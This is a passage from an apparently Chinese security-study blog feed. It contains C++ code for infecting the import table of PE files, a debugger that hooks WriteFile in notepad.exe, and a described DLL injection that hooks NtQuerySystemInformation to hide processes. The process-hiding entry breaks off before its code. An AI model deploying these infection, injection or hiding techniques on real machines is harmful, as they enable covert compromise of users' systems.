(PBYTE)OriginalFirstThunk);<br>FirstThunk[<span class="hljs-number">0</span>] = OriginalFirstThunk[<span class="hljs-number">0</span>];<br><br><br>NewImageImportDescriptor-&gt;OriginalFirstThunk = NewThunkDataVA;<br>NewImageImportDescriptor-&gt;Name = NewThunkDataVA + <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">4</span>;<span class="hljs-comment">//OriginalFirstThunk + FirstThunk的大小</span><br>NewImageImportDescriptor-&gt;FirstThunk = NewThunkDataVA + <span class="hljs-built_in">sizeof</span>(ULONG_PTR) * <span class="hljs-number">2</span>;<br><br><br><span class="hljs-comment">//更新PE头中的几个值</span><br><span class="hljs-comment">//新的导入表大小</span><br>v1.m_ImportDataTable-&gt;Size = NewImportDataSize;<br><span class="hljs-comment">//新的导入表IID的起始偏移</span><br>v1.m_ImportDataTable-&gt;VirtualAddress = v5;<br><span class="hljs-keyword">if</span> (!IsUseNewSection)<br>&#123;<br>ImageSectionHeader-&gt;Misc.VirtualSize += SizeNeed;   <span class="hljs-comment">//缝隙添加</span><br>&#125;<br><br><span class="hljs-comment">//如果ThunkData放在了原IID的位置，需要设置节为可写的</span><br>ImageSectionHeader-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE;<br><br><br><span class="hljs-comment">//清空绑定输入表,强迫加载器重新加载IAT</span><br>v1.m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = <span class="hljs-number">0</span>;<br>v1.m_ImageOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//设置感染标记</span><br>v1.m_ImageDosHeader-&gt;e_csum = INFECT_SIGNATURE;<br><br><br><span class="hljs-comment">//写入文件</span><br><br><br><span class="hljs-comment">//开始保存内存中的修改内容到文件中</span><br><span class="hljs-comment">//先写入新的PE头</span><br>DWORD FileOffset = <span class="hljs-number">0</span>;<br>ULONG_PTR VAInMemory = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">SetFilePointer</span>(FileHandle, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, v1.m_ModuleHandle, v1.m_ImageOptionalHeader-&gt;SizeOfHeaders, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><br><span class="hljs-comment">//写入新IID的子结构信息,位置在原导入表的开始处</span><br>VAInMemory = NewThunkDataVA;<br>FileOffset = v1.<span class="hljs-built_in">Rva2Raw</span>(VAInMemory);<br><span class="hljs-built_in">SetFilePointer</span>(FileHandle, FileOffset, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, OriginalFirstThunk, NewEntrySize, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">//写入新的IID结构</span><br>VAInMemory = (ULONG_PTR)v1.m_ImportDataTable-&gt;VirtualAddress;<br>FileOffset = v1.<span class="hljs-built_in">Rva2Raw</span>(VAInMemory);<br><span class="hljs-built_in">SetFilePointer</span>(FileHandle, FileOffset, <span class="hljs-literal">NULL</span>, FILE_BEGIN);<br>IsOk = <span class="hljs-built_in">WriteFile</span>(FileHandle, v10, NewImportDataSize, &amp;NumberOfBytesWritten, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!IsOk)<br>&#123;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PE感染</category>
      
      <category>导入表感染</category>
      
    </categories>
    
    
    <tags>
      
      <tag>感染</tag>
      
      <tag>PE</tag>
      
      <tag>导入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HookDbg</title>
    <link href="/project/2023/01/29/HookDbg/"/>
    <url>/project/2023/01/29/HookDbg/</url>
    
    <content type="html"><![CDATA[<p>使用远程进程注入调试硬指令实现调试器功能的简单Demo</p><span id="more"></span><p>一、HookDbg前提条件<br>1.windows在动态链接库的使用时在各个进程中的虚拟地址是相同的，所以调试器中的kernel32.dll地址可以当做要被注入的进程的地址用。<br>2.有相关的权限，调试器的权限要能打开目标权限，以及分配内存和写入内存。</p><p>二、HookDbg的相关步骤<br>1.提高当前调试器进程权限<br>2.获取被调试进程的PID(进程ID)<br>3.使调试器附加到PID对应的活动进程并且调试它</p><p>三、HookDbg代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">BOOL <span class="hljs-title">SeEnableSeDebugPrivilege</span><span class="hljs-params">(HANDLE ProcessHandle, BOOL IsEnable)</span></span>; <span class="hljs-comment">//提权</span><br><span class="hljs-function">BOOL <span class="hljs-title">SeGetProcessIdentify</span><span class="hljs-params">(HANDLE* ProcessIdentify, ULONG_PTR ProcessIdentifyLength, <span class="hljs-type">const</span> TCHAR* ImageName, ULONG_PTR ImageNameLength)</span></span>;<br>LPVOID __WriteFile = <span class="hljs-literal">NULL</span>;<br>CREATE_PROCESS_DEBUG_INFO __CreateProcessDebugInfo;;<br>BYTE  __Int3Code = <span class="hljs-number">0xCC</span>;  <span class="hljs-comment">//软件断点</span><br>BYTE __0riginalCode = <span class="hljs-number">0</span>;<br><br><span class="hljs-function">BOOL <span class="hljs-title">OnCreateProcessDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT DebugEvent)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 获取WriteFile() API的地址</span><br>__WriteFile = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(_T(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <span class="hljs-string">&quot;WriteFile&quot;</span>);<br>_tprintf(_T(<span class="hljs-string">&quot;__WriteFile:%p\n&quot;</span>), __WriteFile);<br><span class="hljs-comment">// API钩子 WriteFile()</span><br><span class="hljs-built_in">memcpy</span>(&amp;__CreateProcessDebugInfo, &amp;DebugEvent-&gt;u.CreateProcessInfo, <span class="hljs-built_in">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));<br><span class="hljs-built_in">ReadProcessMemory</span>(__CreateProcessDebugInfo.hProcess, __WriteFile,<br>&amp;__0riginalCode, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br>DWORD OldProtect = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<br><span class="hljs-built_in">WriteProcessMemory</span>(__CreateProcessDebugInfo.hProcess, __WriteFile,<br>&amp;__Int3Code, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, OldProtect, &amp;OldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">OnExceptionDebugEvent</span><span class="hljs-params">(LPDEBUG_EVENT DebugEvent)</span></span><br><span class="hljs-function"></span>&#123;<br>CONTEXT Context;<br>PBYTE VirtualAddress = <span class="hljs-literal">NULL</span>;<br>ULONG_PTR Buffer = <span class="hljs-number">0</span>;<br>ULONG_PTR NumberOfBytesToWrite;<br><span class="hljs-type">int</span> i;<br>PEXCEPTION_RECORD ExceptionRecord = &amp;DebugEvent-&gt;u.Exception.ExceptionRecord;<br><br><span class="hljs-keyword">if</span> (EXCEPTION_BREAKPOINT == ExceptionRecord-&gt;ExceptionCode)<br>&#123;<br><span class="hljs-keyword">if</span> (__WriteFile == ExceptionRecord-&gt;ExceptionAddress)<br>&#123;<br>DWORD OldProtect = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<br><span class="hljs-built_in">WriteProcessMemory</span>(__CreateProcessDebugInfo.hProcess, __WriteFile,<br>&amp;__0riginalCode, <span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, OldProtect, &amp;OldProtect);<br><span class="hljs-comment">// 获取线程上下文</span><br><br><br><span class="hljs-comment">// 获取WriteFile的第2，3个参数</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>Context.ContextFlags = CONTEXT_ALL;<br><span class="hljs-built_in">GetThreadContext</span>(__CreateProcessDebugInfo.hThread, &amp;Context);<br>Buffer = Context.Rdx;<br>NumberOfBytesToWrite = Context.R8;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>Context.ContextFlags = CONTEXT_CONTROL;<br><span class="hljs-built_in">GetThreadContext</span>(__CreateProcessDebugInfo.hThread, &amp;Context);<br><span class="hljs-built_in">ReadProcessMemory</span>(__CreateProcessDebugInfo.hProcess, (LPCVOID)(Context.Esp + <span class="hljs-number">8</span>),<br>&amp;Buffer, <span class="hljs-built_in">sizeof</span>(ULONG_PTR), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">ReadProcessMemory</span>(__CreateProcessDebugInfo.hProcess, (LPCVOID)(Context.Esp + <span class="hljs-number">0xc</span>),<br>&amp;NumberOfBytesToWrite, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><br><span class="hljs-comment">// 分配临时缓冲区</span><br>VirtualAddress = (PBYTE)<span class="hljs-built_in">malloc</span>(NumberOfBytesToWrite + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">memset</span>(VirtualAddress, <span class="hljs-number">0</span>, NumberOfBytesToWrite + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 复制WriteFile缓冲区到临时缓冲区</span><br><span class="hljs-built_in">ReadProcessMemory</span>(__CreateProcessDebugInfo.hProcess, (LPCVOID)Buffer,<br>VirtualAddress, NumberOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n Original String:%s\n&quot;</span>, VirtualAddress);   <span class="hljs-comment">//这里是ASCII字符数据</span><br><br><span class="hljs-comment">//小写字母转大写字母</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NumberOfBytesToWrite; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">0x61</span> &lt;= VirtualAddress[i] &amp;&amp; VirtualAddress[i] &lt;= <span class="hljs-number">0x7A</span>)<br>&#123;<br>VirtualAddress[i] = VirtualAddress[i] - <span class="hljs-number">0x20</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-built_in">WriteProcessMemory</span>(__CreateProcessDebugInfo.hProcess, (LPVOID)Buffer,<br>VirtualAddress, NumberOfBytesToWrite, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">free</span>(VirtualAddress);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br>Context.Rip = (ULONG_PTR)__WriteFile;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>Context.Eip = (ULONG_PTR)__WriteFile;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-built_in">SetThreadContext</span>(__CreateProcessDebugInfo.hThread, &amp;Context);<br><span class="hljs-built_in">ContinueDebugEvent</span>(DebugEvent-&gt;dwProcessId, DebugEvent-&gt;dwThreadId, DBG_CONTINUE);<br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtect);<br><span class="hljs-built_in">WriteProcessMemory</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, &amp;__Int3Code,<br><span class="hljs-built_in">sizeof</span>(BYTE), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">VirtualProtectEx</span>(__CreateProcessDebugInfo.hProcess, __WriteFile, <span class="hljs-number">0x1000</span>, OldProtect, &amp;OldProtect);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DebugLoop</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>DEBUG_EVENT DebugEvent;<br>DWORD ContinueStatus;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">WaitForDebugEvent</span>(&amp;DebugEvent, INFINITE))<br>&#123;<br>ContinueStatus = DBG_CONTINUE;<br><span class="hljs-comment">// 被调试进程生成或附加</span><br><span class="hljs-keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == DebugEvent.dwDebugEventCode)<br><span class="hljs-built_in">OnCreateProcessDebugEvent</span>(&amp;DebugEvent);<br><span class="hljs-comment">// 异常</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXCEPTION_DEBUG_EVENT == DebugEvent.dwDebugEventCode)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">OnExceptionDebugEvent</span>(&amp;DebugEvent))<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">// 中止</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == DebugEvent.dwDebugEventCode)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-built_in">ContinueDebugEvent</span>(DebugEvent.dwProcessId, DebugEvent.dwThreadId, ContinueStatus);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">SeEnableSeDebugPrivilege</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TRUE);<br>HANDLE ProcessIdentify;<br>TCHAR ImageName[MAX_PATH] = &#123; _T(<span class="hljs-string">&quot;notepad.exe&quot;</span>) &#125;;<br><br><span class="hljs-built_in">SeGetProcessIdentify</span>(&amp;ProcessIdentify, <span class="hljs-built_in">sizeof</span>(HANDLE),<br>ImageName, MAX_PATH * <span class="hljs-built_in">sizeof</span>(TCHAR));<br><br><br>​<br><br><span class="hljs-comment">// 使调试器附加到一个活动进程并且调试它</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DebugActiveProcess</span>((DWORD)ProcessIdentify)) <span class="hljs-comment">//激活调试进程</span><br>&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-built_in">DebugLoop</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">SeEnableSeDebugPrivilege</span><span class="hljs-params">(HANDLE ProcessHandle, BOOL IsEnable)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD  LastError;<br>HANDLE TokenHandle = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(ProcessHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle))<br>&#123;<br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">if</span> (TokenHandle)<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br><span class="hljs-keyword">return</span> LastError;<br>&#125;<br>TOKEN_PRIVILEGES TokenPrivileges;<br><span class="hljs-built_in">memset</span>(&amp;TokenPrivileges, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(TOKEN_PRIVILEGES));<br>LUID v1;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;v1))<br>&#123;<br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br><span class="hljs-keyword">return</span> LastError;<br>&#125;<br>TokenPrivileges.PrivilegeCount = <span class="hljs-number">1</span>;<br>TokenPrivileges.Privileges[<span class="hljs-number">0</span>].Luid = v1;<br><span class="hljs-keyword">if</span> (IsEnable)<br>TokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br><span class="hljs-keyword">else</span><br>TokenPrivileges.Privileges[<span class="hljs-number">0</span>].Attributes = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">AdjustTokenPrivileges</span>(TokenHandle, FALSE, &amp;TokenPrivileges, <span class="hljs-built_in">sizeof</span>(TOKEN_PRIVILEGES), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-built_in">CloseHandle</span>(TokenHandle);<br><span class="hljs-keyword">return</span> LastError;<br><br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">SeGetProcessIdentify</span><span class="hljs-params">(HANDLE* ProcessIdentify, ULONG_PTR ProcessIdentifyLength, <span class="hljs-type">const</span> TCHAR* ImageName, ULONG_PTR ImageNameLength)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL IsOk = FALSE;<br>HANDLE SnapshotHandle = INVALID_HANDLE_VALUE;<br>PROCESSENTRY32 ProcessEntry32;<br>ProcessEntry32.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><span class="hljs-type">int</span> LastError = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsBadWritePtr</span>(ProcessIdentify, ProcessIdentifyLength) ||<br><span class="hljs-built_in">IsBadReadPtr</span>(ImageName, ImageNameLength))<br>&#123;<br><br>LastError = ERROR_INVALID_PARAMETER;<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br>SnapshotHandle = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (SnapshotHandle == INVALID_HANDLE_VALUE)<br>&#123;<br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(SnapshotHandle, &amp;ProcessEntry32))<br>&#123;<br><br>LastError = <span class="hljs-built_in">GetLastError</span>();<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br><br><span class="hljs-keyword">do</span><br>&#123;<br><br><span class="hljs-keyword">if</span> (_tcsicmp(ProcessEntry32.szExeFile, ImageName) == <span class="hljs-number">0</span>)<br>&#123;<br>*ProcessIdentify = (HANDLE)ProcessEntry32.th32ProcessID;<br>IsOk = TRUE;<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(SnapshotHandle, &amp;ProcessEntry32));<br><br><br><br>LastError = ERROR_MOD_NOT_FOUND;<br><br>Exit:<br><br><span class="hljs-keyword">if</span> (SnapshotHandle != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-built_in">CloseHandle</span>(SnapshotHandle);<br>&#125;<br>SnapshotHandle = INVALID_HANDLE_VALUE;<br><span class="hljs-built_in">SetLastError</span>(LastError);<br><span class="hljs-keyword">return</span> IsOk;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HOOK</category>
      
    </categories>
    
    
    <tags>
      
      <tag>调试器</tag>
      
      <tag>注入</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HideProcess</title>
    <link href="/project/2023/01/26/HideProcess/"/>
    <url>/project/2023/01/26/HideProcess/</url>
    
    <content type="html"><![CDATA[<p>Dll注入方式：远程线程注入  CreateRemoteThread()<br>该程序主要核心为InstallInlineHook_x86()和InstallInlineHook_x64()两个函数<br>同时由于不同操作系统下，两个函数的实现方式不同</p><span id="more"></span><h4 id="x86位系统下，实现流程为："><a href="#x86位系统下，实现流程为：" class="headerlink" title="x86位系统下，实现流程为："></a>x86位系统下，实现流程为：</h4><p>​    1)借助ntdll.dll模块句柄获取NtQuerySystemInformation的函数地址OriginalAddress 该函数可以遍历进程信息 属于任务管理器的一大特征函数<br>​    2)申请虚拟内存地址 一个跳板地址TrampolineAddress 若VirtualAlloc第一个参数为NULL,分配的内存必以64K的整数倍为内存起始地址,哪怕你只分配一个字节<br>​    3)将获取的NtQuerySystemInformation的函数的前五个指令拷贝到shellcode中<br>​    4)获取OriginalAddress到TrampolineAddress的偏移值，并将该偏移写入shellcode中E9指令后面，用作跳转<br>​    5)将shellcode写入跳板地址处<br>​    6)将跳板地址定义为白名单地址<br>​    7)计算我们注入DLL中的函数FakeNtQuerySystemInformation到NtQuerySystemInformation的偏移 赋给一片带有E9指令的缓冲区后，用作跳转指令<br>​    8)将该跳转指令覆盖源函数的前五个字节</p><h4 id="x64位系统下，实现流程为："><a href="#x64位系统下，实现流程为：" class="headerlink" title="x64位系统下，实现流程为："></a>x64位系统下，实现流程为：</h4><p>​    1)shellcode中的不使用E9跳转指令 而转用FF 25指令 因为E9指令后跟的偏移为4bytes在64位下，可能放不下 所以用FF 25 + 绝对地址的形式<br>​    2)获取模块句柄和函数地址等方法与x86类似<br>​    3)主要区别在于shellcode的编写<br>​    4)为跳板地址分配内存时，需要注意需要可以容纳一个绝对地址 的PAGE 4k(4096B)<br>​    5)将注入Dll的函数的绝对地址写入shellcode</p><p>两个项目<br>1.Dll<br>2.HideProcess</p><p>1.Dll<br>    1)DllMain.h<br>    2)DllMain.cpp</p><p>1)DllMain.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 